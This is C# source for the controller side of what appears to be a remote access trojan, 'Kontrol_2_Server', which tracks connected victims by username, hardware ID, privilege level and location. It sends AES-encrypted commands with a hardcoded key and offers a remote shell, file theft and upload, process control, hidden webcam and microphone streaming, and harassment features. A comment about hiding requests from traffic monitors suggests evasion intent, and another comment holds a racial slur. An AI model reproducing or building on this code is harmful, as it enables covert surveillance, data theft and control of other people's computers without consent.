using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.IO;
using Newtonsoft.Json;
using System.Globalization;
using System.Threading;
using System.Diagnostics;
using System.Runtime;

namespace Kontrol_2_Server

{
	public partial class MainForm : Form
	{
		//Server and client global variables
		private static Socket _serverSocket;
		private const int _BUFFER_SIZE = 20971520;
		private const int _PORT = 100;
		private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
		private static readonly List<Socket> _clientSockets = new List<Socket>();
		private static List<ClientInfo> _clientInfos = new List<ClientInfo>();

		//Form global variables
		public static FileManagerForm fmf = new FileManagerForm();
		public static ProcessForm pmf = new ProcessForm();
		public static RemoteShellForm rsf = new RemoteShellForm();
		public static RemoteCamForm rcf = new RemoteCamForm();
		public static RemoteAudioForm raf = new RemoteAudioForm();

		//File operation variables
		public static string fo_mode = null;
		public static string fo_path = null;
		public static byte[] recvFile = new byte[1];
		public static long fo_size = 0;
		public static long fo_writeSize = 0;

		private static long recievedBytes = 0;
		private static long sentBytes = 0;
		PerformanceCounter cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
		PerformanceCounter ramCounter = new PerformanceCounter("Memory", "Available MBytes");
		public MainForm()
		{
			InitializeComponent();
		}

		private void SetupServer()
		{
			toolStripStatusLabel1.Text = "Status: Starting...";
			_serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			_serverSocket.Bind(new IPEndPoint(IPAddress.Any, _PORT));
			_serverSocket.Listen(5);
			_serverSocket.BeginAccept(AcceptCallBack, null);
			toolStripStatusLabel1.Text = "Status: Online";
			listUpdate.Start();
		}

		private void listClients()
		{
			int selectedClientId = -10;
			//Had to add this cause apperantly if you execute the program alone this function gets executed on the main thread and when debugging it gets executed on a child thread.
			if (ClientsView.InvokeRequired)
			{
				ClientsView.Invoke(new MethodInvoker(delegate
				{
					if (ClientsView.SelectedIndices.Count > 0)
					{
						selectedClientId = ClientsView.SelectedIndices[0];
					}
					ClientsView.Items.Clear();
					for (int i = 0; i < _clientInfos.Count; i++)
					{
						if (_clientSockets[i].Connected)
						{
							string[] row = { _clientInfos[i].id.ToString(), _clientInfos[i].ip, _clientInfos[i].country, _clientInfos[i].machineName, _clientInfos[i].time, _clientInfos[i].os, _clientInfos[i].username, _clientInfos[i].hwid, _clientInfos[i].version, _clientInfos[i].privilege, _clientInfos[i].activeWindow };
							ListViewItem lv = new ListViewItem(row);
							switch (_clientInfos[i].privilege.ToLower())
							{
								case "user":
									lv.ImageIndex = 8;
									break;
								case "admin":
									lv.ImageIndex = 2;
									break;
								default:
									lv.ImageIndex = 8;
									break;
							}
							ClientsView.Items.Add(lv);
						}
						else
						{
							_clientSockets.RemoveAt(i);
							_clientInfos.RemoveAt(i);
						}
					}
					if (selectedClientId != -10)
					{
						ClientsView.Items[selectedClientId].Selected = true;
						ClientsView.Select();
					}
				}));
			}
			else //Main thread so no need to invoke I guess :/
			{
				if (ClientsView.SelectedIndices.Count > 0)
				{
					selectedClientId = ClientsView.SelectedIndices[0];
				}
				ClientsView.Items.Clear();
				for (int i = 0; i < _clientInfos.Count; i++)
				{
					if (_clientSockets[i].Connected)
					{
						string[] row = { _clientInfos[i].id.ToString(), _clientInfos[i].ip, _clientInfos[i].country, _clientInfos[i].machineName, _clientInfos[i].time, _clientInfos[i].os, _clientInfos[i].username, _clientInfos[i].hwid, _clientInfos[i].version, _clientInfos[i].privilege, _clientInfos[i].activeWindow };
						ListViewItem lv = new ListViewItem(row);
						switch (_clientInfos[i].privilege.ToLower())
						{
							case "user":
								lv.ImageIndex = 8;
								break;
							case "admin":
								lv.ImageIndex = 2;
								break;
							default:
								lv.ImageIndex = 8;
								break;
						}
						ClientsView.Items.Add(lv);
					}
					else
					{
						_clientSockets.RemoveAt(i);
						_clientInfos.RemoveAt(i);
					}
				}
				if (_clientSockets.Count > 0 && selectedClientId != -10)
				{
					ClientsView.Items[selectedClientId].Selected = true;
					ClientsView.Select();
				}
			}
		}

		private void CloseAllSockets()
		{
			foreach (Socket socket in _clientSockets)
			{
				socket.Shutdown(SocketShutdown.Both);
				socket.Close();
			}

			_serverSocket.Close();
		}

		private void AcceptCallBack(IAsyncResult ar)
		{
			Socket socket;

			try
			{
				socket = _serverSocket.EndAccept(ar);

			}
			catch (ObjectDisposedException)
			{
				return;
			}

			_clientSockets.Add(socket);
			int id = _clientSockets.Count - 1;
			SendCommand("getinfo-" + id, id);
			socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, RecieveCallBack, socket);
			//SendKeys.SendWait("its ok just not for everybody"); //nigga wut???
			_serverSocket.BeginAccept(AcceptCallBack, null);
		}

		//When client sendds back data to the server
		private void RecieveCallBack(IAsyncResult ar)
		{
			Socket current = (Socket)ar.AsyncState;
			int recieved;
			try
			{
				recieved = current.EndReceive(ar);
			}
			catch (SocketException)
			{
				current.Close();
				_clientInfos.RemoveAt(_clientSockets.IndexOf(current));
				_clientSockets.Remove(current);
				return;
			}
			byte[] recBuf = new byte[recieved];
			Array.Copy(_buffer, recBuf, recieved);
			current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, RecieveCallBack, current);
			string header = Encoding.Unicode.GetString(recBuf, 0, 16);
			new Thread(() => 
			{
				if (header == "servmod^")
				{
					string header_cmd = Encoding.Unicode.GetString(recBuf, 16, 16);
					if (header_cmd == "wcstream")
					{
						MemoryStream ms = new MemoryStream();
						ms.Write(recBuf, 32, recBuf.Length - 32);
						Bitmap frame = (Bitmap)Image.FromStream(ms);
						ms.Flush();
						ms.Close();
						ms.Dispose();
						ms = null;
						Array.Clear(recBuf, 0, recBuf.Length);
						rcf.displayImage(frame);
					}
					else if (header_cmd == "austream")
					{
						byte[] audioBytes = new byte[recBuf.Length - 32];
						Buffer.BlockCopy(recBuf, 32, audioBytes, 0, audioBytes.Length);
						/*using (FileStream fs = new FileStream(@".\mafile.txt", FileMode.OpenOrCreate, FileAccess.Write))
						{
							fs.Write(audioBytes, 0, audioBytes.Length);
						}*/
						raf.processAudio(audioBytes);
					}
				}
				else
				{
					string resp = null;
					try
					{
						resp = Encoding.Unicode.GetString(recBuf);
						resp = Decrypt(resp);
					}
					catch { }
					if (fo_mode == "download")
					{
						DownloadFile(fo_path, recBuf);
					}
					else if (resp.StartsWith("ERROR"))
					{
						MessageBox.Show("Client Error: " + resp.Split('\n')[1], "An error occured on the client side.", MessageBoxButtons.OK, MessageBoxIcon.Error);
					}
					else if (resp.StartsWith("process_info"))
					{
						pmf.setProcessInfo(resp);
					}
					else if (resp.StartsWith("dir_info#"))
					{
						string[] xsplit = resp.Split('#')[1].Split('\n');

						foreach (string entry in xsplit)
						{
							try
							{
								fmf.addFileToList(entry.Split('&')[0], entry.Split('&')[1], entry.Split('&')[2], entry.Split('&')[3], entry.Split('&')[4]);
							}
							catch { }
						}
					}
					else if (resp == "dir_refresh")
					{
						fmf.refreshCurrentDirectory();
					}
					else if (resp.StartsWith("drive_infos#"))
					{
						string[] xsplit = resp.Split('#')[1].Split('\n');
						foreach (string drive in xsplit)
						{
							if (drive.Contains("&"))
							{
								fmf.addFileToList(drive.Split('&')[0], drive.Split('&')[1], "N/A", "", "drive");
							}
						}
					}
					else if (resp.StartsWith("cmd_out"))
					{
						rsf.Append(resp.Split('\n')[1]);
					}
					else if (resp.StartsWith("infoback-"))
					{
						string[] xsplit = resp.Split('\n');
						int id = int.Parse(xsplit[1]);
						if (bool.Parse(xsplit[8]))
						{
							xsplit[8] = "Admin";
						}
						else
						{
							xsplit[8] = "User";
						}
						_clientInfos.Add(new ClientInfo
						{
							id = id,
							ip = _clientSockets[id].RemoteEndPoint.ToString().Split(':')[0],
							country = GetCountry(_clientSockets[id].RemoteEndPoint.ToString().Split(':')[0]),
							machineName = xsplit[2],
							time = xsplit[3],
							username = xsplit[4],
							os = xsplit[5],
							hwid = xsplit[6],
							version = xsplit[7],
							privilege = xsplit[8],
							activeWindow = xsplit[9]
						});
						listClients();
					}
					else if (resp.StartsWith("file_operation"))
					{
						if (resp.Split('\n')[1] == "file_beginUpload")
						{
							//ProgressBarForm.taskName = "Uploading file: " + Path.GetFileName(fo_path);
							//ProgressBarForm.title = "Uploading file...";
							//new ProgressBarForm().Show();
							byte[] fileData = File.ReadAllBytes(fo_path);
							SendBytes(fileData, fmf.clientId);
							fileData = null;
							GCSettings.LargeObjectHeapCompactionMode = GCLargeObjectHeapCompactionMode.CompactOnce;
							GC.Collect(); //shit doesnt work even tho lohc is enabled
						}
						else if (resp.Split('\n')[1] == "file_uploadFinished")
						{
							MessageBox.Show("Uplaod finished!");
							fo_path = null;
						}
						else if (resp.Split('\n')[1] == "file_beginDownload")
						{
							fo_size = long.Parse(resp.Split('\n')[2]);
							recvFile = new byte[fo_size];
							fo_mode = "download";
							SendCommand("file_operation\nfile_beginUpload", fmf.clientId);
						}
					}
					else if (resp.StartsWith("report_progress"))
					{
						MessageBox.Show(resp.Split('\n')[1]);
						ProgressBarForm.percentage = int.Parse(resp.Split('\n')[1]);
					}
					else if (resp.StartsWith("remote_webcam"))
					{
						string[] xsplit = resp.Split('\n');
						switch (xsplit[1])
						{
							case "devices":
								rcf.listDevices(xsplit[2]);
								break;
							case "device_resolutions":
								rcf.listResolutions(xsplit[2]);
								break;
							case "start_display":
								rcf.wcStream = true;
								break;
							case "stop_display":
								rcf.wcStream = false;
								break;
						}
					}
					else if (resp.StartsWith("remote_audio"))
					{
						string[] xsplit = resp.Split('\n');
						switch (xsplit[1])
						{
							case "audio_devices":
								raf.listDevices(xsplit[2]);
								break;
							case "qualities":
								rcf.listResolutions(xsplit[2]);
								break;
							case "start_recording":
								raf.auStream = true;
								break;
							case "stop_recording":
								raf.auStream = false;
								break;
						}
					}
					else if (!string.IsNullOrEmpty(resp))
					{
						//MessageBox.Show(resp);
					}
				}
			}).Start();
			recievedBytes = recBuf.Length;
		}

		public string Encrypt(string text)
		{
			string key = "D(G+KbPeSg";
			byte[] clearBytes = Encoding.Unicode.GetBytes(text);
			using (Aes encryptor = Aes.Create())
			{
				Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
				encryptor.Key = pdb.GetBytes(32);
				encryptor.IV = pdb.GetBytes(16);

				using (MemoryStream ms = new MemoryStream())
				{
					using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cs.Write(clearBytes, 0, clearBytes.Length);
						cs.Close();
					}
					text = Convert.ToBase64String(ms.ToArray());
				}
			}
			return text;
		}
		public string Decrypt(string text)
		{
			string key = "D(G+KbPeSg";
			byte[] cipherBytes = Convert.FromBase64String(text);
			using (Aes encryptor = Aes.Create())
			{
				Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
				encryptor.Key = pdb.GetBytes(32);
				encryptor.IV = pdb.GetBytes(16);

				using (MemoryStream ms = new MemoryStream())
				{
					using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(cipherBytes, 0, cipherBytes.Length);
						cs.Close();
					}
					text = Encoding.Unicode.GetString(ms.ToArray());
				}
			}
			return text;
		}
		public string GetCountry(string ip)
		{
			IpInfo ipInfo = new IpInfo();
			try
			{
				//HttpWebRequest.DefaultWebProxy = new WebProxy(); //Hide the http request from apps like fiddler
				string info = new WebClient().DownloadString("http://ipinfo.io/" + ip);
				ipInfo = JsonConvert.DeserializeObject<IpInfo>(info);
				RegionInfo myRI1 = new RegionInfo(ipInfo.Country);
				ipInfo.Country = myRI1.EnglishName;
			}
			catch (Exception)
			{
				ipInfo.Country = "N/A";
			}

			return ipInfo.Country;
		}
		public void SendCommand(string cmd, int targetClient, bool multi = true)
		{
			if (fo_mode != "upload")
			{
				Socket s = _clientSockets[targetClient];
				string encrypted = Encrypt(cmd);
				byte[] sentData = Encoding.Unicode.GetBytes(encrypted);
				s.Send(sentData);
				sentBytes = sentData.Length;
			}
		}
		public void SendAll(string cmd)
		{
			foreach (int client in ClientsView.Items)
			{
				SendCommand(cmd, client);
			}
		}
		public void SendBytes(byte[] data, int targetClient)
		{
			Socket s = _clientSockets[targetClient];
			s.Send(data);
			sentBytes = data.Length;
		}
		public void SendBytesAll(byte[] data)
		{
			foreach (int client in ClientsView.Items)
			{
				SendBytes(data, client);
			}
		}
		private void MainForm_Shown(object sender, EventArgs e)
		{
			SetupServer();
			statusUpdate.Start();
		}
		private void listUpdate_Tick(object sender, EventArgs e)
		{
			listClients();
		}
		private void microsoftTextToSpeechToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				T2SForm t2sform = new T2SForm();
				t2sform.clientId = ClientsView.SelectedIndices[0];
				t2sform.Show();
			}
		}
		private void sendMessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				int clientIndex = ClientsView.SelectedIndices[0];
				MsgBoxForm msgform = new MsgBoxForm();
				msgform.clientId = clientIndex;
				msgform.Show();
			}
		}
		private void playSinewaveFrequencyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				FrequencyForm freqForm = new FrequencyForm();
				freqForm.clientId = ClientsView.SelectedIndices[0];
				freqForm.Show();
			}
		}
		private void playSystemSoundToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				SoundForm soundForm = new SoundForm();
				soundForm.clientId = ClientsView.SelectedIndices[0];
				soundForm.Show();
			}
		}
		public void uploadFile(string fileName, int clientId)
		{
			Socket _socket = _clientSockets[clientId];
			byte[] fileNameBytes = Encoding.Unicode.GetBytes(fileName);
			byte[] fileNameLen = BitConverter.GetBytes(fileNameBytes.Length);
			byte[] fileData = File.ReadAllBytes(fileName);
			byte[] clientData = new byte[4 + fileNameBytes.Length + fileData.Length];

			fileNameLen.CopyTo(clientData, 0);
			fileNameBytes.CopyTo(clientData, 4);
			fileData.CopyTo(clientData, 4 + fileNameBytes.Length);
			_socket.Send(clientData);
			//_socket.Close();
		}
		public void DownloadFile(string path, byte[] data)
		{
			Buffer.BlockCopy(data, 0, recvFile, (int)fo_writeSize, data.Length); //so buffer.blockcopy is faster than array.copy
			fo_writeSize += data.Length; //Increment the received file size
			//ProgressBarForm.taskName = "fo_writeSize: " + fo_writeSize + "\nfo_size: " + fo_size;
			if (fo_writeSize >= fo_size) //prev. recvFile.Length == fup_size
			{
				using (FileStream fs = File.Create(fo_path))
				{
					fs.Write(recvFile, 0, recvFile.Length);
				}
				fo_writeSize = 0;
				fo_mode = string.Empty;
				Array.Clear(recvFile, 0, recvFile.Length);
				recvFile = null;
				GC.Collect(); //let's be a good citizen to the memory
				SendCommand("file_operation\nfile_uploadFinished", fmf.clientId);
				MessageBox.Show("Download Finished!");
			}
		}
		private void proccessManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				pmf.clientId = ClientsView.SelectedIndices[0];
				pmf.Show();
			}

		}
		private void hideWindowsElementsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				HideElementsForm hef = new HideElementsForm();
				hef.clientId = ClientsView.SelectedIndices[0];
				hef.Show();
			}
		}
		private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				rsf.clientId = ClientsView.SelectedIndices[0];
				rsf.Show();
			}
		}
		private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				fmf.clientId = ClientsView.SelectedIndices[0];
				fmf.username = _clientInfos[ClientsView.SelectedIndices[0]].machineName;
				fmf.Show();
			}
		}
		private void statusUpdate_Tick(object sender, EventArgs e)
		{
			if (this.InvokeRequired)
			{
				statusStrip1.Invoke(new MethodInvoker(delegate
				{
					statusSentLabel.Text = "Sent: " + sentBytes + "B";
					statusRecievedLabel.Text = "Recieved: " + recievedBytes + "B";
					statusRAMLabel.Text = "RAM: " + ramCounter.NextValue() + "MB";
					statusCPULabel.Text = "CPU: " + (int)cpuCounter.NextValue() + "%";
				}));
			}
			else
			{
				statusSentLabel.Text = "Sent: " + sentBytes + "B";
				statusRecievedLabel.Text = "Recieved: " + recievedBytes + "B";
				statusRAMLabel.Text = "RAM: " + ramCounter.NextValue() + "MB";
				statusCPULabel.Text = "CPU: " + (int)cpuCounter.NextValue() + "%";
			}
		}
		private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			//CloseAllSockets();
		}
		private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				rcf.clientId = ClientsView.SelectedIndices[0];
				rcf.Show();
			}
		}
		private void remoteAudioToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				raf.clientId = ClientsView.SelectedIndices[0];
				raf.Show();
			}
		}
	}
	public class ClientInfo
	{
		public int id { get; set; }
		public string ip { get; set; }
		public string country { get; set; }
		public string machineName { get; set; }
		public string time { get; set; }
		public string os { get; set; }
		public string username { get; set; }
		public string hwid { get; set; }
		public string version { get; set; }
		public string privilege { get; set; }
		public string activeWindow { get; set; }
	}
	public class IpInfo
	{
		[JsonProperty("ip")]
		public string Ip { get; set; }

		[JsonProperty("hostname")]
		public string Hostname { get; set; }

		[JsonProperty("city")]
		public string City { get; set; }

		[JsonProperty("region")]
		public string Region { get; set; }

		[JsonProperty("country")]
		public string Country { get; set; }

		[JsonProperty("loc")]
		public string Loc { get; set; }

		[JsonProperty("org")]
		public string Org { get; set; }

		[JsonProperty("postal")]
		public string Postal { get; set; }
	}
}
